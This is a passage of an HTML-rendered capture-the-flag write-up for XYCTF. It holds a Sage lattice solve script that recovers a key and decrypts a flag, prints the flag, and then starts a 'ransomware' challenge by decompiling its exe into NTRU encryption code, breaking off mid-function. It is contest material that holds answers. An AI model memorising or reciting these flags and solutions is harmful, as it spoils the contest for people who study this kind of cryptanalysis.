  <span class=\"token keyword\">for</span> shifts <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>nvariables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            g <span class=\"token operator\">=</span> base <span class=\"token operator\">*</span> prod<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>power<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>variables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> shifts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            G<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span>\n\n    B<span class=\"token punctuation\">,</span> monomials <span class=\"token operator\">=</span> G<span class=\"token punctuation\">.</span>coefficient_matrix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    monomials <span class=\"token operator\">=</span> vector<span class=\"token punctuation\">(</span>monomials<span class=\"token punctuation\">)</span>\n\n    factors <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>monomial<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>bounds<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> monomial <span class=\"token keyword\">in</span> monomials<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> factor <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>factors<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        B<span class=\"token punctuation\">.</span>rescale_col<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> factor<span class=\"token punctuation\">)</span>\n\n    B <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>dense_matrix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    B <span class=\"token operator\">=</span> B<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>QQ<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> factor <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>factors<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        B<span class=\"token punctuation\">.</span>rescale_col<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token operator\">/</span> factor<span class=\"token punctuation\">)</span>\n\n    H <span class=\"token operator\">=</span> Sequence<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>QQ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> B <span class=\"token operator\">*</span> monomials<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        H<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span>\n        I <span class=\"token operator\">=</span> H<span class=\"token punctuation\">.</span>ideal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> I<span class=\"token punctuation\">.</span>dimension<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            H<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> I<span class=\"token punctuation\">.</span>dimension<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            roots <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">for</span> root <span class=\"token keyword\">in</span> I<span class=\"token punctuation\">.</span>variety<span class=\"token punctuation\">(</span>ring<span class=\"token operator\">=</span>ZZ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                root <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">[</span>var<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> var <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">.</span>variables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                roots<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> roots\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Complex</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> re<span class=\"token punctuation\">,</span> im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">=</span> re\n        self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">=</span> im\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__mul__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        re_ <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>re <span class=\"token operator\">-</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>im\n        im_ <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>im <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">*</span> c<span class=\"token punctuation\">.</span>re\n        <span class=\"token keyword\">return</span> Complex<span class=\"token punctuation\">(</span>re_<span class=\"token punctuation\">,</span> im_<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__eq__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>re <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>im\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__rshift__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> Complex<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">>></span> m<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">>></span> m<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__lshift__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> Complex<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">&lt;&lt;</span> m<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">&lt;&lt;</span> m<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>re <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'-'</span> <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> <span class=\"token string\">''</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">i\"</span></span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">i\"</span></span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'+'</span> <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>im <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">i\"</span></span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">tolist</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>re<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">]</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">complex_pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> exp<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    result <span class=\"token operator\">=</span> Complex<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> exp <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> exp <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">=</span> result <span class=\"token operator\">*</span> c\n            result<span class=\"token punctuation\">.</span>re <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>re <span class=\"token operator\">%</span> n\n            result<span class=\"token punctuation\">.</span>im <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>im <span class=\"token operator\">%</span> n\n        c <span class=\"token operator\">=</span> c <span class=\"token operator\">*</span> c\n        c<span class=\"token punctuation\">.</span>re <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>re <span class=\"token operator\">%</span> n\n        c<span class=\"token punctuation\">.</span>im <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>im <span class=\"token operator\">%</span> n\n        exp <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">return</span> result\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span>\nmh <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span><span class=\"token punctuation\">]</span>\nC <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span><span class=\"token punctuation\">]</span>\nenc <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe'</span>\n\nPR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">>=</span>Zmod<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\na<span class=\"token operator\">=</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>x\nb<span class=\"token operator\">=</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>y\nf1<span class=\"token operator\">=</span>a<span class=\"token operator\">^</span><span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>a<span class=\"token operator\">*</span>b<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">-</span>C<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\nroots<span class=\"token operator\">=</span>small_roots<span class=\"token punctuation\">(</span>f1<span class=\"token punctuation\">,</span>bounds<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">129</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>m<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>d<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nm<span class=\"token operator\">=</span>Complex<span class=\"token punctuation\">(</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>mh<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>re <span class=\"token operator\">+</span> m<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ndec<span class=\"token operator\">=</span>ChaCha20<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token operator\">=</span>hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>re <span class=\"token operator\">+</span> m<span class=\"token punctuation\">.</span>im<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nonce<span class=\"token operator\">=</span><span class=\"token string\">b'Pr3d1ctmyxjj'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dec<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}</p>\n</blockquote>\n<h3 id=\"勒索病毒\"><a href=\"#勒索病毒\" class=\"headerlink\" title=\"勒索病毒\"></a>勒索病毒</h3><p>题目给出了exe和加密的16进制数据</p>\n<p>pyinstxtractor反编译一下，编译task.pyc看到注释的代码</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> gmssl <span class=\"token keyword\">import</span> sm4\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>Padding <span class=\"token keyword\">import</span> pad\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> shuffle<span class=\"token punctuation\">,</span> randrange\n\nN <span class=\"token operator\">=</span> <span class=\"token number\">49</span> \np <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nq <span class=\"token operator\">=</span> <span class=\"token number\">128</span>  \nd <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n<span class=\"token keyword\">assert</span> q <span class=\"token operator\">></span> <span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token operator\">*</span> d <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> p\nR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_T</span><span class=\"token punctuation\">(</span>d1<span class=\"token punctuation\">,</span> d2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> N <span class=\"token operator\">>=</span> d1 <span class=\"token operator\">+</span> d2\n    s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> d1 <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> d2 <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>N <span class=\"token operator\">-</span> d1 <span class=\"token operator\">-</span> d2<span class=\"token punctuation\">)</span>\n    shuffle<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">invert_mod_prime</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Rp <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>Integers<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>quotient<span class=\"token punctuation\">(</span>x<span class=\"token operator\">^</span>N <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span>lift<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">/</span> Rp<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">convolution</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">*</span> g<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">^</span>N <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">lift_mod</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> q <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> q<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> q <span class=\"token operator\">//</span> <span class=\"token number\">2</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">poly_mod</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>f<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">%</span> q <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">invert_mod_pow2</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> q<span class=\"token punctuation\">.</span>is_power_of<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    g <span class=\"token operator\">=</span> invert_mod_prime<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        r <span class=\"token operator\">=</span> lift_mod<span class=\"token punctuation\">(</span>convolution<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> r <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> g\n        g <span class=\"token operator\">=</span> lift_mod<span class=\"token punctuation\">(</span>convolution<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_message</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>randrange<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">generate_key</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            f <span class=\"token operator\">=</span> generate_T<span class=\"token punctuation\">(</span>d <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span>\n            g <span class=\"token operator\">=</span> generate_T<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span>\n            Fp <span class=\"token operator\">=</span> poly_mod<span class=\"token punctuation\">(</span>invert_mod_prime<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n            Fq <span class=\"token operator\">=</span> poly_mod<span class=\"token punctuation\">(</span>invert_mod_pow2<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">continue</span>\n    h <span class=\"token operator\">=</span> poly_mod<span class=\"token punctuation\">(</span>convolution<span class=\"token punctuation\">(</span>Fq<span class=\"token punctuation\">,</span> g<span class=\"token 